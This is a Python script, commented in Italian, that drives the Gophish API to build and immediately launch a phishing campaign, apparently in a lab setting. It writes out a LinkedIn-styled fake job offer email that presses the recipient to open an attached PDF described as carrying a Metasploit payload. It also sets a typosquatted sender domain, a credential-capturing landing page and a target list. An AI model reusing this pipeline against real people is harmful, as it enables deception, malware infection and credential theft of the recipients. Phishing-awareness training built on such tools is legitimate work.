import base64
from gophish import Gophish
from gophish.models import Template

# 1) Connessione all’API
api = Gophish(
    api_key="YOUR_API_KEY",
    host="https://127.0.0.1:3333",
    verify=False
)

# 2) Prepara l’allegato
# EVIL_PDF è il pdf con payload malevolo creato con metasploit
with open("EVIL_PDF.pdf", "rb") as f:
    pdf_b64 = base64.b64encode(f.read()).decode()

attachment = {
    "name":    "offerta.pdf",
    "type":    "application/pdf",
    "content": pdf_b64
}

# 3) Definisci il template con HTML e attachment
tpl = Template(
    name="Tech Innovators – Proposta Lavorativa",
    subject="Tech Innovators - Proposta Lavorativa",
    html="""
<html>
  <body style="margin:0;padding:20px;background:#f3f2ef;font-family:Arial,sans-serif;">
    <div style="max-width:600px;margin:auto;background:#fff;border-radius:6px;overflow:hidden;">
      <!-- Header con logo LinkedIn -->
      <div style="background:#0073b1;color:#fff;padding:20px;display:flex;align-items:center;">
        <img
          src="https://cdn-icons-png.flaticon.com/512/174/174857.png"
          alt="LinkedIn Logo"
          width="32" height="32"
          style="display:block;margin-right:12px;"
        >
        <div>
          <h1 style="margin:0;font-size:20px;">Tech Innovators - Proposta Lavorativa</h1>
          <h2 style="margin:5px 0;font-size:16px;">Posizione: Software Engineer</h2>
        </div>
      </div>

      <!-- Corpo dell’email -->
      <div style="padding:20px;color:#333;">
        <p style="font-size:14px;line-height:1.4;">
          Gentile {{.FirstName}} {{.LastName}},<br><br>
          Siamo lieti di proporti un’opportunità nel team di <strong>Tech Innovators S.p.A.</strong> come <strong>Software Engineer</strong>,
          all’interno del reparto <em>R&amp;D</em>. Di seguito i dettagli principali dell’offerta:
        </p>

        <ul style="font-size:14px;line-height:1.4;padding-left:20px;margin-top:0;">
          <li><strong>Inquadramento:</strong> Contratto a tempo indeterminato (CCNL Industria ICT)</li>
          <li><strong>Retribuzione annua lorda:</strong> €40.000 – €45.000, commisurata all’esperienza</li>
          <li><strong>Orario di lavoro:</strong> Full-time, 40h settimanali (flessibilità oraria e smart-working 2 giorni/settimana)</li>
          <li><strong>Sede:</strong> Milano – Via Roma 123 (vicino MM2 Lanza)</li>
          <li><strong>Data prevista di inizio:</strong> 1° ottobre 2025</li>
        </ul>

        <p style="font-size:14px;line-height:1.4;">
          <strong>Responsabilità principali:</strong><br>
          Svilupperai applicazioni web full-stack in JavaScript (React/Node.js), parteciperai alla progettazione architetturale
          e collaborerai con il team QA per garantire l’affidabilità del prodotto.
        </p>

        <p style="font-size:14px;line-height:1.4;">
          Per maggiori informazioni sui benefit aziendali (assicurazione sanitaria integrativa, buoni pasto e piani di formazione)
          e per visionare il processo di selezione completo, apri il PDF allegato a questa email.
        </p>

        <p style="font-size:14px;line-height:1.4;">
          Se l’offerta è di tuo interesse, ti preghiamo di contattarci entro il <strong>15 settembre 2025</strong> all’indirizzo
          email <strong>offer@techinnovators.com</strong>. Saremo felici di rispondere a qualsiasi domanda e organizzare un colloquio
          conoscitivo.
        </p>

        {{.Tracker}}
      </div>

      <!-- Footer -->
      <div style="background:#f3f2ef;color:#666;font-size:12px;text-align:center;padding:20px;">
        Tech Innovators S.p.A. – Via Roma 123, 20121 Milano<br>
        Per non ricevere ulteriori comunicazioni, <a href="{{.URL}}/unsubscribe" style="color:#0073b1;text-decoration:none;">clicca qui</a>.
      </div>
    </div>
  </body>
</html>
""",
    attachments=[attachment]
)

created_tpl = api.templates.post(tpl)
print("Template creato con ID:", created_tpl.id)

from gophish.models import Page, SMTP, Group, Campaign

# 4) Landing page
# Non utilizzata nella simulazione
page = Page(
  name="Page Tech Innovators",
  html="""
  <!DOCTYPE html>
    <html lang="it">
    <head>
        <meta charset="UTF-8">
        <title>Sample Page</title>
    </head>
    <body>
        <h1>Sample Page</h1>
        <p>
            Questa è una semplice pagina HTML di esempio.<br>
            Puoi modificare liberamente questo testo.
        </p>
        <a href="#">Scopri di più</a>
    </body>
    </html>
  """,
  capture_credentials=True,
  redirect_url="https://www.linkedin.com/"
)
created_page = api.pages.post(page)

# 5) Profilo SMTP
smtp = SMTP(
  name="SMTP TechInnovators",
  interface_type="SMTP",
  host="127.0.0.1:1025",
  from_address="inmail-hit-replyy@linkediin.com",
  ignore_cert_errors=True
)
created_smtp = api.smtp.post(smtp)

# 6) Gruppo destinatari
group = Group(
  name="Candidati Software Engineer",
  targets=[
    {"email":"antonio.rossi@lab.com","first_name":"Antonio","last_name":"Rossi","position":""},
  ]
)
created_group = api.groups.post(group)

# 7) Crea e lancia la campagna
camp = Campaign(
  name="Campagna Offerta Tech Innovators",
  template={"name": created_tpl.name},
  page={"name": created_page.name},
  smtp={"name": created_smtp.name},
  groups=[{"name": created_group.name}]
  # no launch_date = invio immediato
)
created_camp = api.campaigns.post(camp)
print("Campagna lanciata con ID:", created_camp.id)
